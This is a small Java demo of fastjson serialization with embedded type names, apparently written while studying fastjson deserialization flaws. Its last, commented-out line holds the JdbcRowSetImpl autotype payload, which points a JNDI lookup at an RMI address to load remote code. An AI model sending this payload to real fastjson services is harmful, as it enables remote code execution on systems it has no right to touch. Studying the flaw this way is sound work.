package top.p0melo.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

import java.math.BigDecimal;

public class main {
    public static void main(String[] args) {
        Store store = new Store();
        store.setName("p0melo");
        Apple apple = new Apple();
        apple.setPrice(new BigDecimal(0.5));
        store.setFruit(apple);

// 序列化为字符串
        String jsonString = JSON.toJSONString(store, SerializerFeature.WriteClassName);
        System.out.println("toJSONString : " + jsonString);
// 反序列化为对象
        Store store1 = JSON.parseObject(jsonString, Store.class);
        System.out.println(store1);

        Apple apple1 = (Apple) store1.getFruit();
        System.out.println(apple1);

//        JSON.parse("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/xxx\",\"autoCommit\":true}");
    }
}
